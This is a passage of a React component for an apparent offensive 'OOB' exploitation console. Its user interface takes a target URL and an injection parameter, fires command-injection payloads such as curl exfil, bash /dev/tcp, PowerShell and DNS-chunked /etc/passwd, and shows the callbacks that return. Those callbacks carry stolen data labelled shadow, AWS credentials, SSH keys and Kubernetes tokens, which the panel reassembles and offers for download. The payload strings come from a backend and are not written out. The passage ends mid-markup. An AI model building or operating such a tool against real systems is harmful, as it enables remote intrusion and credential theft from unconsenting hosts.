import React, { useState, useEffect, useRef, useCallback } from "react";
import { authHeaders, withAuthToken } from "../lib/auth";

const API_URL = (import.meta.env as Record<string,string>)["VITE_API_URL"] ?? "";

interface OobHit {
  id:string; ts:number; type:string; method:string; path:string; sourceIp:string;
  userAgent:string; headers:Record<string,string>; body:string;
  query:Record<string,string>; data:string; token:string; size:number;
  decodedData?:string;
}
interface DnsSession {
  key:string; token:string; prefix:string;
  chunks:Record<number,string>; total:number; received:number;
  complete:boolean; assembled:string|null; decoded:string|null; byteLen:number;
  receivedAt:number; lastChunkAt:number; completedAt:number|null;
}
interface TokenInfo { token:string; cbUrl:string; payloads:Record<string,string>; }
interface ActivateResult {
  ok:boolean; token:string; cbUrl:string; payload:string; payloadType:string;
  targetUrl:string; method:string; injectParam:string;
  status:"sent"|"error"|"timeout"; statusCode:number|null; responseMs:number;
  responseBody:string; error?:string; hint:string;
}

const PREFIX_LABELS:Record<string,string> = {
  p:"passwd", e:"env-secrets", s:"shadow", aws:"aws-creds",
  ssh:"ssh-keys", m:"mass-dump", k:"k8s-token", py:"python", w:"win-env",
};

function timeAgo(ts:number):string {
  const s=Math.floor((Date.now()-ts)/1000);
  if(s<2)return"just now"; if(s<60)return`${s}s ago`;
  if(s<3600)return`${Math.floor(s/60)}m ago`;
  return new Date(ts).toLocaleTimeString();
}
function tryDecode(raw:string):{text:string;decoded:boolean}{
  if(!raw)return{text:"",decoded:false};
  try{
    const dec=atob(raw.replace(/[ ]/g,"+").replace(/-/g,"+").replace(/_/g,"/"));
    if(/^[\x09\x0a\x0d\x20-\x7e]+$/.test(dec)&&dec.length>2)return{text:dec,decoded:true};
  }catch{/**/}
  return{text:raw,decoded:false};
}
function fmtBytes(n:number):string {
  if(n<1024)return`${n}B`;
  if(n<1024*1024)return`${(n/1024).toFixed(1)}KB`;
  return`${(n/1024/1024).toFixed(2)}MB`;
}

const PAYLOAD_LABELS:Record<string,string>={
  curl_exfil:"curl Full Exfil",bash_pipe_raw:"Bash Pipe Raw",
  wget_pixel:"wget Pixel",analytics_beacon:"Analytics Beacon",
  python3_urllib:"Python3 urllib",curl_font_fetch:"curl Font Fetch",
  curl_post_xhr:"curl POST XHR",perl_http:"Perl HTTP",
  python3_socket:"Python3 Socket",bash_devtcp:"Bash /dev/tcp",
  java_url:"Java URL",powershell_iwr:"PowerShell IWR",
  dns_chunk_passwd:"DNS-chunk /etc/passwd",dns_chunk_env:"DNS-chunk ENV secrets",
};

export default function OobPanel(){
  const [tab,          setTab]          = useState<"activate"|"hits"|"dns">("activate");
  const [hits,         setHits]         = useState<OobHit[]>([]);
  const [dnsSessions,  setDnsSessions]  = useState<DnsSession[]>([]);
  const [tokenInfo,    setTokenInfo]    = useState<TokenInfo|null>(null);
  const [connected,    setConnected]    = useState(false);
  const [dnsConnected, setDnsConnected] = useState(false);
  const [expanded,     setExpanded]     = useState<string|null>(null);
  const [copied,       setCopied]       = useState<string|null>(null);
  const [filter,       setFilter]       = useState("");
  const [selPayload,   setSelPayload]   = useState("curl_exfil");
  const [loading,      setLoading]      = useState(false);
  const [expandedDns,  setExpandedDns]  = useState<string|null>(null);

  const [activateTarget,  setActivateTarget]  = useState("");
  const [activateParam,   setActivateParam]   = useState("q");
  const [activateMethod,  setActivateMethod]  = useState("GET");
  const [activatePayload, setActivatePayload] = useState("curl_exfil");
  const [activating,      setActivating]      = useState(false);
  const [activateResult,  setActivateResult]  = useState<ActivateResult|null>(null);
  const [callbackReceived,setCallbackReceived]= useState(false);

  const [streamPhase,    setStreamPhase]    = useState<"idle"|"init"|"fired"|"waiting"|"callback"|"timeout"|"error">("idle");
  const [streamCountdown,setStreamCountdown] = useState(0);
  const [streamElapsed,  setStreamElapsed]   = useState(0);
  const [streamToken,    setStreamToken]     = useState("");
  const [streamCbUrl,    setStreamCbUrl]     = useState("");
  const [streamPayload,  setStreamPayload]   = useState("");
  const [streamCallback, setStreamCallback]  = useState<{hit:OobHit;decodedData:string}|null>(null);
  const [streamFireStatus,setStreamFireStatus] = useState<{status:string;statusCode:number|null;responseMs:number;responseBody:string;error?:string}|null>(null);
  const streamEsRef = useRef<EventSource|null>(null);

  const esRef    = useRef<EventSource|null>(null);
  const dnsEsRef = useRef<EventSource|null>(null);

  useEffect(()=>{
    const es = new EventSource(withAuthToken(`${API_URL}/api/oob/hits/stream`));
    esRef.current = es;
    es.onopen  = ()=>setConnected(true);
    es.onerror = ()=>setConnected(false);
    es.addEventListener("hit",(e:MessageEvent)=>{
      try{
        const hit:OobHit = JSON.parse(e.data as string);
        setHits(p=>[hit,...p].slice(0,500));
        setActivateResult(prev=>{
          if(prev && hit.token===prev.token){ setCallbackReceived(true); }
          return prev;
        });
      }catch{/**/}
    });
    es.addEventListener("cleared",()=>setHits([]));
    return()=>{ es.close(); setConnected(false); };
  },[]);

  useEffect(()=>{
    const es = new EventSource(withAuthToken(`${API_URL}/api/oob/dns-sessions/stream`));
    dnsEsRef.current = es;
    es.onopen  = ()=>setDnsConnected(true);
    es.onerror = ()=>setDnsConnected(false);
    es.addEventListener("session",(e:MessageEvent)=>{
      try{
        const s:DnsSession = JSON.parse(e.data as string);
        setDnsSessions(prev=>{
          const idx=prev.findIndex(x=>x.key===s.key);
          if(idx>=0){ const n=[...prev]; n[idx]=s; return n; }
          return [s,...prev].slice(0,200);
        });
      }catch{/**/}
    });
    es.addEventListener("chunk",(e:MessageEvent)=>{
      try{
        const d=JSON.parse(e.data as string) as {key:string;received:number;total:number};
        setDnsSessions(prev=>prev.map(s=>s.key===d.key?{...s,received:d.received,total:d.total}:s));
      }catch{/**/}
    });
    es.addEventListener("complete",(e:MessageEvent)=>{
      try{
        const s:DnsSession=JSON.parse(e.data as string);
        setDnsSessions(prev=>{
          const idx=prev.findIndex(x=>x.key===s.key);
          if(idx>=0){ const n=[...prev]; n[idx]=s; return n; }
          return [s,...prev];
        });
      }catch{/**/}
    });
    es.addEventListener("cleared",()=>setDnsSessions([]));
    return()=>{ es.close(); setDnsConnected(false); };
  },[]);

  const copy = useCallback((text:string,id:string)=>{
    navigator.clipboard.writeText(text).then(()=>{ setCopied(id); setTimeout(()=>setCopied(c=>c===id?null:c),1800); }).catch(()=>{});
  },[]);

  const genToken = useCallback(async()=>{
    setLoading(true);
    try{ const r=await fetch(`${API_URL}/api/oob/token`,{headers:authHeaders()}); setTokenInfo(await r.json() as TokenInfo); }catch{/**/}
    setLoading(false);
  },[]);

  const doClear = useCallback(async()=>{
    await fetch(`${API_URL}/api/oob/hits`,{method:"DELETE",headers:authHeaders()}).catch(()=>{});
    setHits([]);
  },[]);

  const doClearDns = useCallback(async()=>{
    await fetch(`${API_URL}/api/oob/dns-sessions`,{method:"DELETE",headers:authHeaders()}).catch(()=>{});
    setDnsSessions([]);
  },[]);

  useEffect(()=>{ genToken(); },[genToken]);

  const fireActivate = useCallback(()=>{
    if(!activateTarget.trim()) return;
    if(streamEsRef.current){ streamEsRef.current.close(); streamEsRef.current=null; }
    setActivating(true);
    setActivateResult(null);
    setCallbackReceived(false);
    setStreamPhase("init");
    setStreamCountdown(60);
    setStreamElapsed(0);
    setStreamToken("");
    setStreamCbUrl("");
    setStreamPayload("");
    setStreamCallback(null);
    setStreamFireStatus(null);

    const params = new URLSearchParams({
      targetUrl:   activateTarget.trim(),
      payloadType: activatePayload,
      injectParam: activateParam.trim()||"q",
      method:      activateMethod,
      timeout:     "60",
    });
    const url = withAuthToken(`${API_URL}/api/oob/activate/stream?${params.toString()}`);
    const es  = new EventSource(url);
    streamEsRef.current = es;

    es.addEventListener("init",(e:MessageEvent)=>{
      try{
        const d=JSON.parse(e.data as string) as {token:string;cbUrl:string;payload:string;timeoutSec:number};
        setStreamToken(d.token);
        setStreamCbUrl(d.cbUrl);
        setStreamPayload(d.payload);
        setStreamCountdown(d.timeoutSec??60);
        setStreamPhase("init");
      }catch{/**/}
    });
    es.addEventListener("fired",(e:MessageEvent)=>{
      try{
        const d=JSON.parse(e.data as string) as {status:string;statusCode:number|null;responseMs:number;responseBody:string;error?:string};
        setStreamFireStatus(d);
        setStreamPhase("fired");
        setActivating(false);
      }catch{/**/}
    });
    es.addEventListener("waiting",(e:MessageEvent)=>{
      try{
        const d=JSON.parse(e.data as string) as {remaining:number;elapsed:number};
        setStreamCountdown(d.remaining);
        setStreamElapsed(d.elapsed);
        setStreamPhase("waiting");
      }catch{/**/}
    });
    es.addEventListener("callback",(e:MessageEvent)=>{
      try{
        const d=JSON.parse(e.data as string) as {hit:OobHit;decodedData:string;elapsed:number};
        setStreamCallback({hit:d.hit,decodedData:d.decodedData});
        setStreamElapsed(d.elapsed);
        setStreamPhase("callback");
        setCallbackReceived(true);
        setActivating(false);
        es.close();
        streamEsRef.current=null;
      }catch{/**/}
    });
    es.addEventListener("timeout",()=>{
      setStreamPhase("timeout");
      setActivating(false);
      es.close();
      streamEsRef.current=null;
    });
    es.onerror=()=>{
      setStreamPhase(p=>p==="idle"?"error":p);
      setActivating(false);
    };
  },[activateTarget,activatePayload,activateParam,activateMethod]);

  const filtered=hits.filter(h=>!filter||h.token.includes(filter)||h.sourceIp.includes(filter)||
    (h.data||"").toLowerCase().includes(filter.toLowerCase())||h.method.includes(filter.toUpperCase()));

  const downloadDecoded = (s:DnsSession)=>{
    const data=s.decoded??(s.assembled?atob(s.assembled):"");
    const blob=new Blob([data],{type:"text/plain"});
    const a=document.createElement("a");
    a.href=URL.createObjectURL(blob);
    a.download=`dns_exfil_${s.token.slice(0,8)}_${s.prefix}.txt`;
    a.click();
    URL.revokeObjectURL(a.href);
  };

  const statusColor = (s:"sent"|"error"|"timeout")=>
    s==="sent"?"text-green-400":s==="timeout"?"text-yellow-400":"text-red-400";

  return(
    <div className="flex flex-col h-full bg-black text-zinc-300 font-mono text-xs overflow-hidden">
      <div className="flex items-center gap-2 px-3 py-1.5 bg-zinc-950 border-b border-zinc-900 shrink-0">
        <span className="text-red-500 font-bold uppercase tracking-widest text-[11px]">OOB</span>

        <div className="flex items-center gap-1 ml-1">
          <button onClick={()=>setTab("activate")}
            className={`px-2 py-0.5 text-[10px] uppercase font-bold border transition-colors ${tab==="activate"?"border-red-700 bg-red-950/40 text-red-400":"border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>
            ACTIVATE
          </button>
          <button onClick={()=>setTab("hits")}
            className={`px-2 py-0.5 text-[10px] uppercase font-bold border transition-colors ${tab==="hits"?"border-orange-700 bg-orange-950/30 text-orange-400":"border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>
            HTTP {hits.length>0&&<span className="ml-1 text-[9px]">({hits.length})</span>}
          </button>
          <button onClick={()=>setTab("dns")}
            className={`px-2 py-0.5 text-[10px] uppercase font-bold border transition-colors ${tab==="dns"?"border-cyan-800 bg-cyan-950/40 text-cyan-400":"border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>
            DNS {dnsSessions.filter(s=>s.complete).length>0&&<span className="ml-1 text-[9px] text-green-500">({dnsSessions.filter(s=>s.complete).length}✓)</span>}
          </button>
        </div>

        <div className="flex items-center gap-1.5 ml-auto">
          <div className={`w-1.5 h-1.5 rounded-full ${connected?"bg-green-500 animate-pulse":"bg-red-700"}`}/>
          <span className={`text-[10px] ${connected?"text-green-600":"text-red-600"}`}>{connected?"LIVE":"OFFLINE"}</span>
        </div>
      </div>

      {/* ── ACTIVATE TAB ───────────────────────────────────────────────── */}
      {tab==="activate"&&(
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="w-80 shrink-0 border-r border-zinc-900 flex flex-col overflow-hidden">
            <div className="p-3 border-b border-zinc-900 space-y-2.5">
              <div className="text-[10px] text-red-400 uppercase font-bold tracking-wider">Remote OOB Trigger</div>
              <div className="space-y-1.5">
                <label className="text-[9px] text-zinc-600 uppercase">Target URL</label>
                <input
                  value={activateTarget}
                  onChange={e=>setActivateTarget(e.target.value)}
                  placeholder="http://target.host/vulnerable?param="
                  className="w-full bg-zinc-900 border border-zinc-800 text-zinc-200 text-[10px] px-2 py-1.5 placeholder-zinc-700 focus:outline-none focus:border-red-800"
                />
              </div>
              <div className="flex gap-2">
                <div className="flex-1 space-y-1">
                  <label className="text-[9px] text-zinc-600 uppercase">Method</label>
                  <select value={activateMethod} onChange={e=>setActivateMethod(e.target.value)}
                    className="w-full bg-zinc-900 border border-zinc-800 text-zinc-300 text-[10px] px-2 py-1.5 focus:outline-none">
                    <option value="GET">GET</option>
                    <option value="POST">POST</option>
                  </select>
                </div>
                <div className="flex-1 space-y-1">
                  <label className="text-[9px] text-zinc-600 uppercase">Inject Param</label>
                  <input
                    value={activateParam}
                    onChange={e=>setActivateParam(e.target.value)}
                    placeholder="q"
                    className="w-full bg-zinc-900 border border-zinc-800 text-zinc-200 text-[10px] px-2 py-1.5 placeholder-zinc-700 focus:outline-none focus:border-zinc-600"
                  />
                </div>
              </div>
              <div className="space-y-1">
                <label className="text-[9px] text-zinc-600 uppercase">Payload Type</label>
                <select value={activatePayload} onChange={e=>setActivatePayload(e.target.value)}
                  className="w-full bg-zinc-900 border border-zinc-800 text-zinc-300 text-[10px] px-2 py-1.5 focus:outline-none">
                  {Object.entries(PAYLOAD_LABELS).map(([k,v])=><option key={k} value={k}>{v}</option>)}
                </select>
              </div>
              <button
                onClick={()=>void fireActivate()}
                disabled={activating||!activateTarget.trim()}
                className="w-full py-1.5 border border-red-800 text-red-400 text-[10px] uppercase tracking-wider hover:bg-red-950/30 disabled:opacity-40 disabled:cursor-not-allowed transition-colors font-bold">
                {activating?"FIRING…":"⚡ FIRE PAYLOAD"}
              </button>
            </div>

            {streamPhase!=="idle"&&(
              <div className="p-3 space-y-2 border-b border-zinc-900 overflow-y-auto flex-1">

                {/* Phase badge */}
                <div className="flex items-center gap-2">
                  {streamPhase==="init"&&<><span className="text-yellow-400 animate-pulse text-[10px]">●</span><span className="text-yellow-400 text-[10px] font-bold uppercase">INITIALIZING</span></>}
                  {streamPhase==="fired"&&<><span className="text-blue-400 text-[10px]">●</span><span className="text-blue-400 text-[10px] font-bold uppercase">PAYLOAD FIRED</span></>}
                  {streamPhase==="waiting"&&<><span className="text-yellow-500 animate-pulse text-[10px]">●</span><span className="text-yellow-500 text-[10px] font-bold uppercase">WAITING</span><span className="ml-auto text-[10px] font-mono text-yellow-600">{streamCountdown}s</span></>}
                  {streamPhase==="callback"&&<><span className="text-green-400 text-[11px]">✔</span><span className="text-green-400 text-[10px] font-bold uppercase">CALLBACK RECEIVED</span><span className="ml-auto text-[9px] text-green-700">{streamElapsed}s</span></>}
                  {streamPhase==="timeout"&&<><span className="text-zinc-500 text-[10px]">✗</span><span className="text-zinc-500 text-[10px] font-bold uppercase">TIMEOUT — NO CALLBACK</span></>}
                  {streamPhase==="error"&&<><span className="text-red-400 text-[10px]">✗</span><span className="text-red-400 text-[10px] font-bold uppercase">STREAM ERROR</span></>}
                </div>

                {/* Countdown bar */}
                {(streamPhase==="waiting"||streamPhase==="fired")&&(
                  <div className="w-full bg-zinc-900 rounded h-1">
                    <div className="bg-yellow-600 h-1 rounded transition-all duration-1000"
                      style={{width:`${Math.min(100,((60-streamCountdown)/60)*100)}%`}}/>
                  </div>
                )}

                {/* Fire status */}
                {streamFireStatus&&(
                  <div className={`bg-zinc-900 border ${streamFireStatus.status==="sent"?"border-blue-900":"border-red-900/40"} p-2 space-y-1`}>
                    <div className="flex items-center gap-2">
                      <span className="text-[9px] text-zinc-600 uppercase">Target Response</span>
                      <span className={`text-[10px] font-bold ${streamFireStatus.status==="sent"?"text-blue-400":streamFireStatus.status==="timeout"?"text-yellow-400":"text-red-400"}`}>{streamFireStatus.status.toUpperCase()}</span>
                      {streamFireStatus.statusCode!=null&&<span className="text-zinc-500 text-[10px]">HTTP {streamFireStatus.statusCode}</span>}
                      <span className="ml-auto text-[9px] text-zinc-700">{streamFireStatus.responseMs}ms</span>
                    </div>
                    {streamFireStatus.error&&<div className="text-red-400 text-[10px]">{streamFireStatus.error}</div>}
                    {streamFireStatus.responseBody&&<pre className="text-zinc-500 text-[10px] whitespace-pre-wrap break-all">{streamFireStatus.responseBody}</pre>}
                  </div>
                )}

                {/* Callback data */}
                {streamPhase==="callback"&&streamCallback&&(
                  <div className="bg-green-950/20 border border-green-800 p-2 space-y-2">
                    <div className="flex items-center gap-2">
                      <span className="text-[9px] text-green-700 uppercase">Exfil Data</span>
                      <button onClick={()=>copy(streamCallback.decodedData,"cb-data")} className="ml-auto text-[9px] text-green-700 hover:text-green-400">{copied==="cb-data"?"✓":"COPY"}</button>
                    </div>
                    <code className="text-green-400 text-[10px] break-all whitespace-pre-wrap block">{streamCallback.decodedData.slice(0,600)}</code>
                    <div className="grid grid-cols-2 gap-1 text-[9px]">
                      <div><span className="text-zinc-600">IP: </span><span className="text-zinc-400">{streamCallback.hit.sourceIp}</span></div>
                      <div><span className="text-zinc-600">UA: </span><span className="text-zinc-400 truncate">{streamCallback.hit.userAgent?.slice(0,30)}</span></div>
                    </div>
                  </div>
                )}

                {/* Token / CB URL */}
                {streamToken&&(
                  <div className="bg-zinc-900 border border-zinc-800 p-2 space-y-1">
                    <div className="flex justify-between">
                      <span className="text-[9px] text-zinc-600">TOKEN</span>
                      <button onClick={()=>copy(streamToken,"st-tok")} className="text-[9px] text-zinc-600 hover:text-green-400">{copied==="st-tok"?"✓":"COPY"}</button>
                    </div>
                    <code className="text-green-400 text-[10px] break-all">{streamToken}</code>
                  </div>
                )}
                {streamCbUrl&&(
                  <div className="bg-zinc-900 border border-zinc-800 p-2 space-y-1">
                    <div className="flex justify-between">
                      <span className="text-[9px] text-zinc-600">CALLBACK URL</span>
                      <button onClick={()=>copy(streamCbUrl,"st-cb")} className="text-[9px] text-zinc-600 hover:text-green-400">{copied==="st-cb"?"✓":"COPY"}</button>
                    </div>
                    <code className="text-orange-400 text-[10px] break-all">{streamCbUrl}</code>
                  </div>
                )}
                {streamPayload&&(
                  <div className="bg-zinc-900 border border-zinc-800 p-2 space-y-1">
                    <div className="flex justify-between">
                      <span className="text-[9px] text-zinc-600">FIRED PAYLOAD</span>
                      <button onClick={()=>copy(streamPayload,"st-pl")} className="text-[9px] text-zinc-600 hover:text-green-400">{copied==="st-pl"?"✓":"COPY"}</button>
                    </div>
                    <code className="text-cyan-400 text-[10px] break-all whitespace-pre-wrap">{streamPayload}</code>
                  </div>
                )}
              </div>
            )}
          </div>

          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            <div className="p-3 border-b border-zinc-900 space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-[10px] text-zinc-500 uppercase">Manual Callback URL</span>
                <button onClick={genToken} disabled={loading}
                  className="text-[9px] text-zinc-500 hover:text-green-400 border border-zinc-800 px-2 py-0.5 disabled:opacity-40">
                  {loading?"…":"NEW TOKEN"}
                </button>
              </div>
              {tokenInfo&&(
                <>
                  <div className="bg-zinc-900 border border-zinc-800 rounded p-2">
                    <div className="flex justify-between mb-1">
                      <span className="text-[9px] text-zinc-600">CALLBACK URL</span>
                      <button onClick={()=>copy(tokenInfo.cbUrl,"cb2")} className="text-[9px] text-zinc-600 hover:text-green-400">{copied==="cb2"?"✓":"COPY"}</button>
                    </div>
                    <code className="text-orange-400 text-[10px] break-all">{tokenInfo.cbUrl}</code>
                  </div>
                  <div>
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-[9px] text-zinc-600 uppercase">Sample Payload</span>
                      <select value={selPayload} onChange={e=>setSelPayload(e.target.value)}
                        className="bg-zinc-900 border border-zinc-800 text-zinc-400 text-[9px] px-1 py-0.5">
                        {Object.entries(PAYLOAD_LABELS).map(([k,v])=><option key={k} value={k}>{v}</option>)}
                      </select>
                    </div>
                    {tokenInfo.payloads[selPayload]&&(
                      <div className="bg-zinc-950 border border-zinc-800 rounded p-2 relative">
                        <button onClick={()=>copy(tokenInfo.payloads[selPayload]!,"pl2")}
                          className="absolute top-1 right-1 text-[9px] text-zinc-600 hover:text-green-400">
                          {copied==="pl2"?"✓":"COPY"}
                        </button>
                        <code className="text-cyan-400 text-[10px] break-all whitespace-pre-wrap">{tokenInfo.payloads[selPayload]}</code>
                      </div>
                    )}
                  </div>
                </>
              )}
            </div>
            <div className="flex-1 flex items-center justify-center text-zinc-700 text-[11px] flex-col gap-2">
              <span>Enter a target URL on the left and fire a payload</span>
              <span className="text-zinc-800 text-[10px]">Callbacks appear in the HTTP tab in real-time</span>
            </div>
          </div>
        </div>
      )}

      {/* ── HTTP HITS TAB ─────────────────────────────────────────────── */}
      {tab==="hits"&&(
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="w-80 shrink-0 border-r border-zinc-900 flex flex-col overflow-hidden">
            <div className="p-3 border-b border-zinc-900 space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-[10px] text-orange-400 uppercase">Callback URL</span>
                <button onClick={genToken} disabled={loading}
                  className="text-[9px] text-zinc-500 hover:text-green-400 border border-zinc-800 px-2 py-0.5 disabled:opacity-40">
                  {loading?"…":"NEW TOKEN"}
                </button>
              </div>
              {tokenInfo&&(<>
                <div className="bg-zinc-900 border border-zinc-800 rounded p-2">
                  <div className="flex justify-between mb-1">
                    <span className="text-[9px] text-zinc-600">TOKEN</span>
                    <button onClick={()=>copy(tokenInfo.token,"tok")} className="text-[9px] text-zinc-600 hover:text-green-400">{copied==="tok"?"✓":"COPY"}</button>
                  </div>
                  <code className="text-green-400 text-[10px] break-all">{tokenInfo.token}</code>
                </div>
                <div className="bg-zinc-900 border border-zinc-800 rounded p-2">
                  <div className="flex justify-between mb-1">
                    <span className="text-[9px] text-zinc-600">CALLBACK URL</span>
                    <button onClick={()=>copy(tokenInfo.cbUrl,"cb")} className="text-[9px] text-zinc-600 hover:text-green-400">{copied==="cb"?"✓":"COPY"}</button>
                  </div>
                  <code className="text-orange-400 text-[10px] break-all">{tokenInfo.cbUrl}</code>
                </div>
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-[9px] text-zinc-600 uppercase">Payload</span>
                    <select value={selPayload} onChange={e=>setSelPayload(e.target.value)}
                      className="bg-zinc-900 border border-zinc-800 text-zinc-400 text-[9px] px-1 py-0.5">
                      {Object.entries(PAYLOAD_LABELS).map(([k,v])=><option key={k} value={k}>{v}</option>)}
                    </select>
                  </div>
                  {tokenInfo.payloads[selPayload]&&(
                    <div className="bg-zinc-950 border border-zinc-800 rounded p-2 relative">
                      <button onClick={()=>copy(tokenInfo.payloads[selPayload]!,"pl")}
                        className="absolute top-1 right-1 text-[9px] text-zinc-600 hover:text-green-400">
                        {copied==="pl"?"✓":"COPY"}
                      </button>
                      <code className="text-cyan-400 text-[10px] break-all whitespace-pre-wrap">{tokenInfo.payloads[selPayload]}</code>
                    </div>
                  )}
                </div>
              </>)}
            </div>
            <div className="px-3 py-2 border-b border-zinc-900 flex items-center gap-2">
              <input value={filter} onChange={e=>setFilter(e.target.value)} placeholder="Filter by token / IP / data…"
                className="flex-1 bg-zinc-950 border border-zinc-800 text-zinc-300 text-[10px] px-2 py-1 placeholder-zinc-700 focus:outline-none focus:border-zinc-600"/>
              <span className="text-zinc-700 text-[10px] shrink-0">{filtered.length}</span>
              <button onClick={doClear} className="text-[10px] text-zinc-600 hover:text-red-400 border border-zinc-800 px-2 py-0.5 hover:border-red-700">CLR</button>
            </div>
            <div className="flex-1 overflow-y-auto">
              {filtered.length===0&&(
                <div className="p-4 text-center text-zinc-700 text-[10px]">
                  {hits.length===0?"Waiting for callbacks…":"No hits match filter"}
                </div>
              )}
              {filtered.map(h=>{
                const {text:dec,decoded}=tryDecode(h.data);
                return(
                  <div key={h.id} onClick={()=>setExpanded(e=>e===h.id?null:h.id)}
                    className={`px-3 py-2 border-b border-zinc-900 cursor-pointer hover:bg-zinc-950 ${expanded===h.id?"bg-zinc-950":""}`}>
                    <div className="flex items-center gap-2 mb-0.5">
                      <span className="text-orange-400 font-bold text-[10px]">{h.method}</span>
                      <span className="text-zinc-600 text-[9px] ml-auto">{timeAgo(h.ts)}</span>
                    </div>
                    <div className="text-zinc-500 text-[10px] truncate">{h.token}</div>
                    {h.data&&<div className={`text-[10px] truncate mt-0.5 ${decoded?"text-green-400":"text-cyan-400"}`}>{decoded&&"[decoded] "}{dec.slice(0,60)}</div>}
                    {expanded===h.id&&(
                      <div className="mt-2 space-y-1 text-[10px]">
                        <div><span className="text-zinc-600">IP: </span><span className="text-zinc-300">{h.sourceIp}</span></div>
                        <div><span className="text-zinc-600">Path: </span><span className="text-zinc-300">{h.path}</span></div>
                        <div><span className="text-zinc-600">UA: </span><span className="text-zinc-400">{h.userAgent?.slice(0,80)}</span></div>
                        {h.body&&<div><span className="text-zinc-600">Body: </span><span className="text-amber-400">{h.body.slice(0,100)}</span></div>}
                        {h.data&&(
                          <div className="bg-zinc-900 rounded p-2 mt-1">
                            <div className="flex justify-between mb-1">
                              <span className="text-zinc-600">Data{decoded?" (b64 decoded)":""}</span>
                              <button onClick={e=>{e.stopPropagation();copy(dec,`d${h.id}`);}} className="text-zinc-600 hover:text-green-400">{copied===`d${h.id}`?"✓":"COPY"}</button>
                            </div>
                            <code className="text-green-400 break-all whitespace-pre-wrap">{dec.slice(0,400)}</code>
                          </div>
                        )}
                        {Object.keys(h.query).length>0&&(
                          <div><span className="text-zinc-600">Query: </span>
                            {Object.entries(h.query).map(([k,v])=>(
                              <span key={k} className="text-zinc-400">{k}={v} </span>
                            ))}
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </div>
          <div className="flex-1 flex items-center justify-center text-zinc-800 text-[11px]">
            {filtered.length===0
              ? <span>No OOB hits yet — use ACTIVATE tab to fire a payload</span>
              : <span className="text-zinc-700">Select a hit on the left to expand details</span>}
          </div>
        </div>
      )}

      {/* ── DNS CHUNKS TAB ─────────────────────────────────────────────── */}
      {tab==="dns"&&(
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="w-72 shrink-0 border-r border-zinc-900 flex flex-col overflow-hidden">
            <div className="px-3 py-2 border-b border-zinc-900 flex items-center justify-between">
              <span className="text-[10px] text-zinc-600">{dnsSessions.length} sessions</span>
              <button onClick={doClearDns} className="text-[10px] text-zinc-600 hover:text-red-400 border border-zinc-800 px-2 py-0.5 hover:border-red-700">CLEAR</button>
            </div>
            <div className="flex-1 overflow-y-auto">
              {dnsSessions.length===0&&(
                <div className="p-4 text-center text-zinc-700 text-[10px]">Waiting for DNS chunk sessions…</div>
              )}
              {dnsSessions.map(s=>{
                const pct=s.total>0?Math.round((s.received/s.total)*100):0;
                const label=PREFIX_LABELS[s.prefix]??s.prefix;
                return(
                  <div key={s.key} onClick={()=>setExpandedDns(k=>k===s.key?null:s.key)}
                    className={`px-3 py-2 border-b border-zinc-900 cursor-pointer hover:bg-zinc-950 ${expandedDns===s.key?"bg-zinc-950":""}`}>
                    <div className="flex items-center gap-2 mb-1">
                      {s.complete
                        ? <span className="text-[9px] px-1 border border-green-800 text-green-400 bg-green-950/30">COMPLETE</span>
                        : <span className="text-[9px] px-1 border border-yellow-800 text-yellow-400 bg-yellow-950/30">COLLECTING</span>
                      }
                      <span className="text-cyan-400 text-[10px] font-bold">{label}</span>
                      <span className="text-zinc-600 text-[9px] ml-auto">{timeAgo(s.lastChunkAt)}</span>
                    </div>
                    <div className="text-zinc-600 text-[9px] truncate mb-1">{s.token}</div>
                    <div className="h-1 bg-zinc-900 rounded-full overflow-hidden mb-1">
                      <div className={`h-full transition-all ${s.complete?"bg-green-600":"bg-cyan-700"}`} style={{width:`${pct}%`}}/>
                    </div>
                    <div className="flex justify-between text-[9px] text-zinc-600">
                      <span>{s.received}/{s.total} ({pct}%)</span>
                      {s.byteLen>0&&<span>{fmtBytes(s.byteLen)}</span>}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            {expandedDns&&(()=>{
              const s=dnsSessions.find(x=>x.key===expandedDns);
              if(!s)return <div className="flex-1 flex items-center justify-center text-zinc-800 text-[11px]">Session not found</div>;
              const label=PREFIX_LABELS[s.prefix]??s.prefix;
              const pct=s.total>0?Math.round((s.received/s.total)*100):0;
              return(
                <div className="flex flex-col flex-1 min-h-0 overflow-hidden p-3 gap-3">
                  <div className="flex items-center gap-3">
                    <span className="text-cyan-400 font-bold uppercase">{label}</span>
                    {s.complete
                      ? <span className="text-[10px] px-1.5 border border-green-800 text-green-400">ASSEMBLED</span>
                      : <span className="text-[10px] px-1.5 border border-yellow-800 text-yellow-400">COLLECTING {pct}%</span>
                    }
                    {s.complete&&<span className="text-zinc-600 text-[10px]">{fmtBytes(s.byteLen)}</span>}
                    <div className="ml-auto flex gap-2">
                      {s.complete&&(
                        <>
                          <button onClick={()=>copy(s.decoded??s.assembled??"",'dns-copy')}
                            className="text-[10px] border border-zinc-800 px-2 py-0.5 text-zinc-500 hover:text-green-400 hover:border-green-800">
                            {copied==="dns-copy"?"✓ COPIED":"COPY"}
                          </button>
                          <button onClick={()=>downloadDecoded(s)}
                            className="text-[10px] border border-cyan-900 px-2 py-0.5 text-cyan-600 hover:text-cyan-300 hover:border-cyan-600">
                            DOWNLOAD
                          </button>
                        </>
                      )}
                    </div>
                  </div>
                  <div className="text-[10px] text-zinc-600">
                    Token: <code className="text-zinc-400">{s.token}</code> · Prefix: <code className="text-cyan-400">{s.prefix}</code>
                    {s.completedAt&&<> · Completed: <span className="text-green-400">{new Date(s.completedAt).toLocaleTimeString()}</span></>}
                  </div>
                  {!s.complete&&(
                    <div className="border border-zinc-900 p-2">
                      <div className="h-2 bg-zinc-900 rounded-full overflow-hidden mb-1">
                        <div className="h-full bg-cyan-700 transition-all" style={{width:`${pct}%`}}/>
                      </div>
